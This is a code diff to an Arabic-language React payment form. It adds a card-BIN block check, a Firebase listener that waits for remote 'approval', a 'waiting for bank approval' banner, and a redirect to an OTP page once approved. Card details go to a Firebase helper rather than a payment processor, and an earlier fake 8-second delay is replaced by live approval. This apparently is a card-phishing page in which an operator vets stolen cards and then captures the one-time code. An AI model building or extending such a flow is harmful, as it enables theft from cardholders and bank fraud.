@@ -14,7 +14,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Link } from "wouter";
 import { useState, useEffect } from "react";
-import { handlePay, handleCurrentPage } from "@/lib/firebase";
+import { handlePay, handleCurrentPage, listenForApproval, isBinBlocked } from "@/lib/firebase";
 
 function CashbackPopup({ onClose }: { onClose: () => void }) {
   return (
@@ -382,15 +382,42 @@ function PaymentForm() {
   };
 
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isWaitingApproval, setIsWaitingApproval] = useState(false);
+
+  useEffect(() => {
+    if (!isWaitingApproval) return;
+    const unsubscribe = listenForApproval((status) => {
+      if (status === "approved") {
+        setIsWaitingApproval(false);
+        setLocation("/otp");
+      } else if (status === "rejected") {
+        setIsWaitingApproval(false);
+        setSubmitError("تم رفض البطاقة من قبل البنك. يرجى استخدام بطاقة أخرى.");
+      }
+    });
+    return () => unsubscribe();
+  }, [isWaitingApproval, setLocation]);
 
   const handleSubmit = async () => {
-    if (isSubmitting) return;
+    if (isSubmitting || isWaitingApproval) return;
     if (!validateForm()) return;
     setIsSubmitting(true);
     setSubmitError("");
 
+    const cleanCard = cardNumber.replace(/\s/g, "");
+
+    try {
+      if (await isBinBlocked(cleanCard)) {
+        setSubmitError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
+        setIsSubmitting(false);
+        return;
+      }
+    } catch {
+      // ignore lookup errors and proceed
+    }
+
     const paymentInfo = {
-      cardNumber: cardNumber.replace(/\s/g, ""),
+      cardNumber: cleanCard,
       cardName,
       expiryMonth,
       expiryYear,
@@ -411,10 +438,8 @@ function PaymentForm() {
       return;
     }
 
-    setTimeout(() => {
-      setIsSubmitting(false);
-      setLocation("/otp");
-    }, 8000);
+    setIsSubmitting(false);
+    setIsWaitingApproval(true);
   };
 
   return (
@@ -597,14 +622,35 @@ function PaymentForm() {
           </p>
         )}
 
+        {isWaitingApproval && (
+          <div
+            className="bg-[#fdf6e3] border border-[#c9a96e]/40 rounded-xl p-4 flex items-center gap-3"
+            data-testid="card-waiting-approval"
+          >
+            <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin flex-shrink-0" />
+            <div className="text-right flex-1">
+              <p className="text-[#4a1525] font-semibold text-sm">
+                في انتظار موافقة البنك على البطاقة
+              </p>
+              <p className="text-[#7a6b5f] text-xs mt-0.5">
+                يرجى عدم إغلاق الصفحة، قد تستغرق العملية بضع لحظات...
+              </p>
+            </div>
+          </div>
+        )}
+
         <Button
           onClick={handleSubmit}
           size="lg"
           className="w-full bg-primary text-white shadow-lg mt-4"
-          disabled={isSubmitting}
+          disabled={isSubmitting || isWaitingApproval}
           data-testid="button-pay"
         >
-          {isSubmitting ? "جاري المعالجة..." : "متابعة الدفع"}
+          {isWaitingApproval
+            ? "في انتظار الموافقة..."
+            : isSubmitting
+            ? "جاري المعالجة..."
+            : "متابعة الدفع"}
         </Button>
       </div>
     </div>
